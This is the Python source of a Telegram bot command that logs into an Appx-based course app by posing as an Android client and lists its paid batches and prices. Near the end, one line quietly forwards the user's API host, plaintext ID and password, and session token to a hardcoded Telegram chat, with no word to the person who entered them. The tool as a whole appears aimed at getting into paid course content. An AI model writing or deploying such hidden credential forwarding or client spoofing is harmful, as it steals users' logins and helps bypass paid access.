import json
from handlers import *
from weasyprint import HTML
from jinja2 import Template
from pyrogram.types import InputMediaDocument
import subprocess
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
from subprocess import getstatusoutput
import logging
import main
import config
import os
import cloudscraper

my_data = -1001938939742
sudo_group = config.GROUPS
ADMINS = config.ADMINS

@bot.on_message(filters.command("list2") & (filters.chat(sudo_group) | filters.user(ADMINS)))
#@bot.on_message(filters.command("list2"))
async def start(bot, m):
    editable = await bot.send_message(m.chat.id, "Send **API** For Getting All Batch Available in Application 🚀")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **ID & Password** in this manner otherwise bot will not reply.\n\nSend like this »  ID*Password.")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        #'Content-Length': '225',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
    	data["email"] = raw_text.split("*")[0]
    	data["password"] = raw_text.split("*")[1]    
    	scraper = cloudscraper.create_scraper()	
    	html = scraper.post("https://"+raw_text05+"/post/userLogin",data,headers=login_hdr).content
    	output = json.loads(html)
    	token = output["data"]["token"]
    	userid = output["data"]["userid"]
    else:
    	token = raw_text.split("$")[0]
    	userid = raw_text.split("$")[1]
    	
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }        
    scraper = cloudscraper.create_scraper()
    html1, unique_set = [], set()
    categories = scraper.get(f"https://{raw_text05}/get/coursecategories", headers=hdr).json()["data"]
    resp = scraper.get(f'https://{raw_text05}/get/folder_courses?&start=-1&parent_id=-1', headers=hdr).json()["data"]
    for data in resp:
        batch_id, batch_name, batch_price = (data["id"]), (data["course_name"]), (data["price"])
        unique_set.add(batch_id)
        html1.append({"id": batch_id, "course_name": batch_name, "price": batch_price})
    for category in categories:
      resp = scraper.get(f'https://{raw_text05}/get/folder_courses?exam_name={category["exam_category"]}&start=-1&parent_id=-1', headers=hdr).json()["data"]
      for data in resp:
        batch_id, batch_name, batch_price = (data["id"]), (data["course_name"]), (data["price"])
        if batch_id not in unique_set:
          unique_set.add(batch_id)
          html1.append({"id": batch_id, "course_name": batch_name, "price": batch_price})
            
    topicid = html1
    
    cool = ""
    for data in topicid:
        #aa = f" `{data['id']}` » {data['course_name']}\n\n"
        aa = f" `{data['id']}` » {data['course_name']} ✳️ {data['price']}₹\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    #await editable.edit(f"Login successful✔️")
    #editable1 = await bot.send_message(m.chat.id, f"Login Success..\n\n{cool}\nSend ID:")
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
    await editable.edit(f"Login Success✅....You have these batches :-\n\n{cool}\nSend ID:")
    input1 = await bot.listen(editable.chat.id)
